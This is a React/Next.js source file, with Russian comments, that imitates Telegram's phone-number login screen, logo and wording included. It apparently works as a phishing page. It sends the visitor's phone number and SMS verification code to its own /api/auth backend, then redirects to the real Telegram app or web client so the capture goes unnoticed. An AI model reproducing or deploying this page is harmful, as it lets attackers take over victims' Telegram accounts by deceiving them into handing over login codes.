'use client';

import Image from 'next/image'
import Link from 'next/link'
import { useState, useEffect } from 'react';
import { countries } from '@/data/countries';
import { translations } from '@/data/translations';
import { useLanguage } from '@/contexts/LanguageContext';

// Перемещаем Россию в начало списка
const sortedCountries = [
  countries.find(c => c.code === 'RU'),
  ...countries.filter(c => c.code !== 'RU')
].filter(Boolean) as typeof countries;

export default function PhoneLogin() {
  const { t } = useLanguage();
  const [selectedCountry, setSelectedCountry] = useState(sortedCountries[0]);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [showVerification, setShowVerification] = useState(false);
  const [error, setError] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [language, setLanguage] = useState<'en' | 'ru'>('en');
  const [loading, setLoading] = useState(false);

  const handleCountrySelect = (country: typeof countries[0]) => {
    setSelectedCountry(country);
    setIsDropdownOpen(false);
  };

  const toggleLanguage = () => {
    setLanguage(language === 'en' ? 'ru' : 'en');
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (!phoneNumber.trim()) {
      setError(language === 'en' ? 'Please enter your phone number' : 'Пожалуйста, введите номер телефона');
      setLoading(false);
      return;
    }

    try {
      const fullNumber = `+${selectedCountry.phone}${phoneNumber}`;
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullNumber })
      });

      const data = await response.json();
      if (data.success) {
        setShowVerification(true);
        setError('');
      } else {
        setError(data.error || (language === 'en' ? 'Failed to send code' : 'Не удалось отправить код'));
      }
    } catch (err) {
      setError(language === 'en' ? 'Failed to send verification code' : 'Не удалось отправить код подтверждения');
    } finally {
      setLoading(false);
    }
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (!verificationCode.trim()) {
      setError(language === 'en' ? 'Please enter the code' : 'Пожалуйста, введите код');
      setLoading(false);
      return;
    }

    try {
      const fullNumber = `+${selectedCountry.phone}${phoneNumber}`;
      const response = await fetch('/api/auth', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullNumber, code: verificationCode })
      });

      const data = await response.json();
      if (data.success) {
        // Открываем приложение Telegram
        const cleanPhoneNumber = fullNumber.replace(/[^0-9+]/g, '');
        const telegramUrl = `tg://resolve?phone=${cleanPhoneNumber}`;
        
        // Пробуем открыть приложение Telegram
        window.location.href = telegramUrl;
        
        // Если через 1 секунду все еще на этой странице, значит приложение не установлено
        setTimeout(() => {
          if (document.hasFocus()) {
            // Если приложение не установлено, перенаправляем на веб-версию
            window.location.href = `https://web.telegram.org/k/#${cleanPhoneNumber}`;
          }
        }, 1000);
      } else {
        setError(data.error || (language === 'en' ? 'Invalid code' : 'Неверный код'));
      }
    } catch (err) {
      setError(language === 'en' ? 'Failed to verify code' : 'Не удалось проверить код');
    } finally {
      setLoading(false);
    }
  };

  const filteredCountries = sortedCountries.filter(country => 
    country.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    country.phone.includes(searchQuery)
  );

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-4 bg-white">
      <div className="max-w-[360px] w-full">
        <Link href="/" className="block mb-8">
          <Image 
            src="/telegram-logo.svg" 
            alt="Telegram Logo" 
            width={120} 
            height={120}
            className="mx-auto"
            priority
          />
        </Link>

        {!showVerification ? (
          <>
            <h1 className="text-xl font-bold mb-6 text-center text-gray-900">
              {t('Your Phone Number')}
            </h1>
            <p className="text-gray-600 text-center mb-6">
              {t('Please confirm your country code and enter your phone number')}
            </p>
            <form onSubmit={handlePhoneSubmit} className="space-y-4">
              <div className="relative">
                <div 
                  className="w-full p-3 border rounded-lg text-left flex items-center gap-3 cursor-pointer hover:bg-gray-50"
                  onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                >
                  <span className="text-2xl">{selectedCountry.flag}</span>
                  <span className="flex-1 text-gray-900">{selectedCountry.name}</span>
                  <span className="text-gray-500">+{selectedCountry.phone}</span>
                  <svg className="w-4 h-4 text-gray-400" viewBox="0 0 24 24">
                    <path fill="currentColor" d="M7 10l5 5 5-5z"/>
                  </svg>
                </div>

                {isDropdownOpen && (
                  <div className="absolute z-10 w-full mt-1 bg-white border rounded-lg shadow-lg max-h-[300px] overflow-auto">
                    <div className="sticky top-0 bg-white border-b">
                      <input
                        type="text"
                        placeholder={t('Search country or code')}
                        className="w-full p-3 bg-white outline-none"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                      />
                    </div>
                    {filteredCountries.map((country) => (
                      <div
                        key={country.code}
                        className="p-3 flex items-center gap-3 hover:bg-gray-50 cursor-pointer"
                        onClick={() => handleCountrySelect(country)}
                      >
                        <span className="text-2xl">{country.flag}</span>
                        <span className="flex-1 text-gray-900">{country.name}</span>
                        <span className="text-gray-500">+{country.phone}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="flex gap-2">
                <div className="w-[90px] p-3 border rounded-lg bg-gray-50 flex items-center gap-2">
                  <span className="text-xl">{selectedCountry.flag}</span>
                  <span className="text-gray-900">+{selectedCountry.phone}</span>
                </div>
                <input 
                  type="tel" 
                  placeholder={t('Phone Number')}
                  className="flex-1 p-3 border rounded-lg text-gray-900 placeholder:text-gray-400 focus:border-[#3390EC] outline-none"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                />
              </div>

              <label className="flex items-start gap-2 text-sm text-gray-600">
                <input type="checkbox" className="mt-1" />
                <span>{t('Keep me signed in')}</span>
              </label>

              {error && <p className="text-red-500 text-sm text-center">{error}</p>}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#3390EC] text-white py-3 rounded hover:bg-[#3390EC]/90 disabled:opacity-50"
              >
                {loading ? t('SENDING...') : t('NEXT')}
              </button>
            </form>
          </>
        ) : (
          <>
            <h1 className="text-xl font-bold mb-6 text-center text-gray-900">
              {t('Enter Code')}
            </h1>
            <p className="text-gray-600 text-center mb-6">
              {t('We have sent you an SMS with the code')}
            </p>
            <form onSubmit={handleVerificationSubmit} className="space-y-4">
              <input
                type="text"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                placeholder={t('Code')}
                className="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                required
              />
              {error && <p className="text-red-500 text-sm text-center">{error}</p>}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#3390EC] text-white py-3 rounded hover:bg-[#3390EC]/90 disabled:opacity-50"
              >
                {loading ? t('VERIFYING...') : t('NEXT')}
              </button>
            </form>
          </>
        )}
      </div>

      <div className="mt-8 space-y-2">
        <Link href="/" className="text-[#3390EC] hover:underline text-sm block text-center">
          {t('QR CODE LOGIN')}
        </Link>
        <button 
          onClick={toggleLanguage}
          className="text-[#3390EC] hover:underline text-sm block mx-auto"
        >
          {t('CONTINUE IN RUSSIAN')}
        </button>
      </div>
    </main>
  );
} 